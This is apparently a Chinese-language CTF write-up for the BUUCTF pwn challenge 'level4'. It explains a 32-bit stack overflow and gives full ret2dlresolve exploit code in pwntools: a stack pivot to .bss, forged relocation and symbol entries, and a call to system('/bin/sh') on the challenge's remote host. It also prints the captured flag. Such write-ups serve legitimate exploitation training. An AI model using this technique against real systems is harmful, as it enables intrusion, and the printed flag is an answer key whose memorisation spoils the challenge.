+++
title = "codex"
date = "2026-04-16"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
# level4 详细 WP

## 题目信息

- 题目文件：`level4`
- 远程环境：`node5.buuoj.cn:28980`
- 程序类型：`32-bit ELF`
- 目标：利用程序漏洞拿到 shell，并读取 flag

最终拿到的 flag：

```text
flag{7615020a-7615-462f-8ed9-00f7f5f2f16f}
```

---

## 一、程序分析

先看程序保护：

```text
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

可以得到几个关键信息：

- `32位程序`
- `无 Canary`，说明栈溢出后不需要绕过栈保护
- `NX 开启`，说明不能直接在栈上执行 shellcode
- `No PIE`，说明程序基址固定，ROP 地址稳定
- `Partial RELRO`，GOT 仍有一定利用价值

这类题的常规思路就是：

1. 找到栈溢出点
2. 由于 `NX` 开启，转而使用 `ROP`
3. 如果没有现成 `system`、`/bin/sh`，就考虑：
   - 泄漏 libc 后 ret2libc
   - 或者直接 `ret2dlresolve`

这题非常适合 `ret2dlresolve`

---

## 二、漏洞点分析

关键函数反汇编如下：

```asm
0x804844b:	push	ebp
0x804844c:	mov	ebp, esp
0x804844e:	sub	esp, 0x88
0x8048454:	sub	esp, 4
0x8048457:	push	0x100
0x804845c:	lea	eax, [ebp - 0x88]
0x8048462:	push	eax
0x8048463:	push	0
0x8048465:	call	0x8048310        ; read
0x804846a:	add	esp, 0x10
0x804846d:	nop
0x804846e:	leave
0x804846f:	ret
```

这段逻辑很清楚：

```c
char buf[0x88];
read(0, buf, 0x100);
```

问题在于：

- 栈上只分配了 `0x88` 字节
- 却读入了 `0x100` 字节

因此存在**明显的栈溢出**

---

## 三、覆盖偏移计算

局部变量大小是：

```text
buf = 0x88
saved ebp = 4
```

所以返回地址偏移为：

```text
offset = 0x88 + 4 = 0x8c
```

即：

```python
offset = 0x88 + 4
```

只要输入超过 `0x8c` 字节，就可以控制返回地址。

---

## 四、为什么选择 ret2dlresolve

这题导入的函数很少，主要有：

- `read`
- `write`

如果走传统 `ret2libc`，通常需要：

1. 先泄漏某个 libc 地址
2. 再次构造 payload 回到程序
3. 计算 libc base
4. 调用 `system("/bin/sh")`

但这题本身很适合 `ret2dlresolve`，因为：

- 程序是动态链接
- 有 `plt[0]`
- 有 `.rel.plt`、`.dynsym`、`.dynstr`
- 可以伪造重定位条目和符号表项
- 直接让动态链接器帮我们解析 `system`

这样就不依赖远程 libc 版本，做起来更稳。

---

## 五、利用思路总览

整体分两阶段：

### 第一阶段

利用栈溢出，构造 ROP：

1. 调用 `read(0, base_stage, 100)`  
   把第二阶段 payload 读入 `.bss`
2. 将 `ebp` 改为 `.bss` 上的新栈地址
3. 执行 `leave; ret` 完成**栈迁移**

### 第二阶段

在 `.bss` 上伪造：

- `Elf32_Rel`
- `Elf32_Sym`
- 字符串 `"system\x00"`

再通过调用 `plt[0]` 触发动态解析，最终等价于调用：

```c
system("/bin/sh")
```

拿到 shell 后执行：

```sh
cat flag
```

---

## 六、关键地址整理

从程序中可得到：

```python
read_plt    = 0x08048310
write_got   = 0x0804a018
plt_0       = 0x08048300

pop3_ret    = 0x08048509
pop_ebp_ret = 0x0804850b
leave_ret   = 0x080483b8

.bss        = 0x0804a024
.rel.plt    = 0x080482b0
.dynsym     = 0x080481cc
.dynstr     = 0x0804822c
```

其中 gadget 对应关系：

```asm
0x8048509: pop esi
0x804850a: pop edi
0x804850b: pop ebp
0x804850c: ret
```

所以 `0x08048509` 可以当作连续弹 3 个参数的 gadget 来使用。

---

## 七、第一阶段：栈迁移

### 1. 为什么要栈迁移

第一次 `read` 最多只能输入 `0x100` 字节，空间有限，不太适合塞完整的 `ret2dlresolve` 伪造结构。

因此更稳的做法是：

- 第一阶段只负责“搭桥”
- 第二阶段把完整结构写到 `.bss`
- 再把栈切换过去

### 2. 第一阶段 ROP

构造如下：

```python
payload1 = flat(
    b"A" * offset,
    p32(read_plt),        # read(0, base_stage, 100)
    p32(pop3_ret),
    p32(0),
    p32(base_stage),
    p32(100),
    p32(pop_ebp_ret),     # ebp = base_stage
    p32(base_stage),
    p32(leave_ret)        # esp = ebp; ret
)
```

逻辑解释：

#### 第一步：调用 read

```c
read(0, base_stage, 100)
```

把第二阶段内容写到 `.bss`

#### 第二步：修改 ebp

```asm
pop ebp ; ret
```

令：

```text
ebp = base_stage
```

#### 第三步：leave; ret

`leave` 等价于：

```asm
mov esp, ebp
pop ebp
```

于是栈就被迁移到 `.bss` 区域了，之后程序会从 `.bss` 上继续取返回地址和参数。

---

## 八、第二阶段：ret2dlresolve 原理

`ret2dlresolve` 的核心思想是：

> 手工伪造动态链接器需要的结构体，让解析器帮我们把 `system` 解析出来。

动态链接时，PLT 会借助以下几个区域：

- `.plt`
- `.rel.plt`
- `.dynsym`
- `.dynstr`

当程序调用某个未解析函数时，会进入 `plt[0]`，然后动态链接器根据重定位表去解析真正地址。

如果我们能伪造一个假的重定位项和假的符号表项，再让解析器去处理它，就能让它帮我们解析出 `system`。

---

## 九、ret2dlresolve 需要伪造什么

### 1. 伪造重定位表项 `Elf32_Rel`

`Elf32_Rel` 大小 8 字节：

```c
typedef struct {
    Elf32_Addr  r_offset;
    Elf32_Word  r_info;
} Elf32_Rel;
```

构造：

- `r_offset`：写解析结果的位置
- `r_info`：指向伪造的符号表项，并指定类型

这里一般把 `r_offset` 设为某个 GOT 表项，比如 `write@got`

```python
fake_rel = flat(
    p32(write_got),
    p32(r_info)
)
```

### 2. 伪造符号表项 `Elf32_Sym`

`Elf32_Sym` 大小 16 字节：

```c
typedef struct {
    Elf32_Word    st_name;
    Elf32_Addr    st_value;
    Elf32_Word    st_size;
    unsigned char st_info;
    unsigned char st_other;
    Elf32_Half    st_shndx;
} Elf32_Sym;
```

重点只需要 `st_name` 有效，指向字符串 `"system"` 在 `.dynstr` 中的偏移。

```python
fake_sym = flat(
    p32(fake_str_addr - strtab),
    p32(0),
    p32(0),
    p32(0x12)
)
```

### 3. 伪造字符串 `"system\x00"`

```python
b"system\x00"
```

---

## 十、对齐问题

这是 `ret2dlresolve` 里最容易出错的点。

`Elf32_Sym` 要求按 16 字节对齐，所以通常需要计算一个 `align`：

```python
align = (0x10 - ((base_stage + 36 - dynsym) & 0xf)) & 0xf
fake_sym_addr = base_stage + 36 + align
```

如果不对齐，动态链接器解析时很容易崩溃。

---

## 十一、第二阶段 payload 构造

关键代码如下：

```python
cmd = b"/bin/sh\x00"
fake_rel_addr = base_stage + 28
align = (0x10 - ((base_stage + 36 - DYNSYM) & 0xF)) & 0xF
fake_sym_addr = base_stage + 36 + align
fake_str_addr = fake_sym_addr + 0x10

r_info = (((fake_sym_addr - DYNSYM) // 0x10) << 8) | 0x7
fake_rel = flat(p32(WRITE_GOT), p32(r_info))
fake_sym = flat(p32(fake_str_addr - STRTAB), p32(0), p32(0), p32(0x12))

payload2 = flat(
    b"AAAA",
    p32(PLT0),
    p32(fake_rel_addr - REL_PLT),
    p32(POP3_RET),
    p32(base_stage + 80),
    p32(base_stage + 80),
    p32(len(cmd)),
    fake_rel,
    b"A" * align,
    fake_sym,
    b"system\x00",
)
payload2 = payload2.ljust(80, b"A") + cmd
payload2 = payload2.ljust(100, b"A")
```

---

## 十二、为什么这样布置栈

第二阶段迁移到 `.bss` 后，栈布局大概如下：

```text
base_stage:
    "AAAA"                 -> 被 leave/pop ebp 吃掉
    PLT0                   -> ret 到这里，进入动态解析
    reloc_arg              -> 告诉解析器去处理哪个重定位项
    POP3_RET               -> system 返回后的地址
    arg1 = base_stage+80   -> system("/bin/sh") 的参数
    arg2 = base_stage+80   -> 给 POP3_RET 凑栈
    arg3 = len(cmd)        -> 给 POP3_RET 凑栈
    fake_rel
    padding
    fake_sym
    "system\x00"
    ...
    "/bin/sh\x00"
```

注意这里：

### 1. `PLT0`

调用方式本质上类似：

```c
dl_runtime_resolve(reloc_index)
```

### 2. `reloc_arg`

传的是：

```python
fake_rel_addr - rel_plt
```

因为动态解析器是通过 `.rel.plt` 基址加偏移去找条目的。

### 3. `system` 参数

当解析结束后，控制流会跳到解析得到的 `system`，其栈上参数就是：

```python
p32(base_stage + 80)
```

即指向 `/bin/sh\x00`

---

## 十三、完整 exp

```python
from pwn import *

context.clear(arch="i386", os="linux")
context.log_level = "info"

HOST = "node5.buuoj.cn"
PORT = 28980

elf = ELF("./level4")

OFFSET = 0x88 + 4
READ_PLT = elf.plt["read"]
WRITE_GOT = elf.got["write"]
PLT0 = 0x08048300
POP3_RET = 0x08048509
POP_EBP_RET = 0x0804850B
LEAVE_RET = 0x080483B8

BSS = elf.get_section_by_name(".bss").header.sh_addr
REL_PLT = elf.get_section_by_name(".rel.plt").header.sh_addr
DYNSYM = elf.get_section_by_name(".dynsym").header.sh_addr
STRTAB = elf.get_section_by_name(".dynstr").header.sh_addr

STACK_SIZE = 0x800
BASE_STAGE = BSS + STACK_SIZE


def build_stage1():
    chain = flat(
        b"A" * OFFSET,
        p32(READ_PLT),
        p32(POP3_RET),
        p32(0),
        p32(BASE_STAGE),
        p32(100),
        p32(POP_EBP_RET),
        p32(BASE_STAGE),
        p32(LEAVE_RET),
    )
    return chain.ljust(0x100, b"A")


def build_stage2():
    cmd = b"/bin/sh\x00"
    fake_rel_addr = BASE_STAGE + 28
    align = (0x10 - ((BASE_STAGE + 36 - DYNSYM) & 0xF)) & 0xF
    fake_sym_addr = BASE_STAGE + 36 + align
    fake_str_addr = fake_sym_addr + 0x10

    r_info = (((fake_sym_addr - DYNSYM) // 0x10) << 8) | 0x7
    fake_rel = flat(p32(WRITE_GOT), p32(r_info))
    fake_sym = flat(p32(fake_str_addr - STRTAB), p32(0), p32(0), p32(0x12))

    payload = flat(
        b"AAAA",
        p32(PLT0),
        p32(fake_rel_addr - REL_PLT),
        p32(POP3_RET),
        p32(BASE_STAGE + 80),
        p32(BASE_STAGE + 80),
        p32(len(cmd)),
        fake_rel,
        b"A" * align,
        fake_sym,
        b"system\x00",
    )
    payload = payload.ljust(80, b"A") + cmd
    return payload.ljust(100, b"A")


io = remote(HOST, PORT)
io.send(build_stage1())
io.send(build_stage2())
io.interactive()
```

如果想直接读 flag，也可以这样：

```python
io = remote(HOST, PORT)
io.send(build_stage1())
io.send(build_stage2())
io.sendline(b"cat flag")
io.interactive()
```

---

## 十四、利用过程总结

整个攻击链可以概括为：

1. `read(0, buf, 0x100)` 触发栈溢出
2. 覆盖返回地址，执行第一阶段 ROP
3. 第一阶段调用 `read(0, .bss, 100)`，把第二阶段数据写到 `.bss`
4. 通过 `pop ebp; ret` 和 `leave; ret` 完成栈迁移
5. 第二阶段在 `.bss` 中伪造：
   - `Elf32_Rel`
   - `Elf32_Sym`
   - `"system\x00"`
6. 调用 `plt[0]`，让动态链接器解析 `system`
7. 解析完成后执行 `system("/bin/sh")`
8. 拿到 shell，读取 `flag`

---

## 十五、这题的考点

这题的核心考点有几个：

### 1. 栈溢出基础

看到：

```c
read(0, buf, 0x100)
```

且 `buf` 明显小于 `0x100`，就要第一时间想到返回地址可控。

### 2. NX 开启后的利用方式

不能打 shellcode，就要转向 ROP。

### 3. 栈迁移

第一阶段空间不够时，常见手法就是：

- 迁移到 `.bss`
- 迁移到堆
- 迁移到可控大缓冲区

### 4. ret2dlresolve

当程序里没有 `system`，也不想依赖远程 libc 泄漏时，`ret2dlresolve` 是非常强的方案。

---

## 十六、易错点

这题有几个很容易出错的地方：

### 1. 第一阶段长度

程序第一次 `read` 读的是 `0x100` 字节，所以第一阶段最好补到正好 `0x100`，避免输入残留影响第二次 `read`。

```python
return chain.ljust(0x100, b"A")
```

### 2. 第二阶段长度

第一阶段 ROP 中第二次 `read` 读的是 `100` 字节，所以第二阶段也要控制成正好 `100` 字节：

```python
return payload.ljust(100, b"A")
```

### 3. `Elf32_Sym` 对齐

必须按 16 字节对齐，不然大概率崩。

### 4. `r_info` 计算

```python
r_info = (((fake_sym_addr - DYNSYM) // 0x10) << 8) | 0x7
```

这里的符号索引和重定位类型都不能写错。

### 5. `reloc_arg`

传给 `plt[0]` 的不是绝对地址，而是相对于 `.rel.plt` 的偏移：

```python
fake_rel_addr - REL_PLT
```

---

## 十七、最终结果

成功拿到 shell 并读出 flag：

```text
flag{7615020a-7615-462f-8ed9-00f7f5f2f16f}
```

---

## 十八、附：一句话总结

这题本质上是一个：

```text
32位无 canary 栈溢出 + 栈迁移 + ret2dlresolve
```

利用链简洁直接，重点在于：

- 找准偏移
- 做好 `.bss` 栈迁移
- 正确伪造 `Elf32_Rel` 和 `Elf32_Sym`
- 注意对齐和长度控制
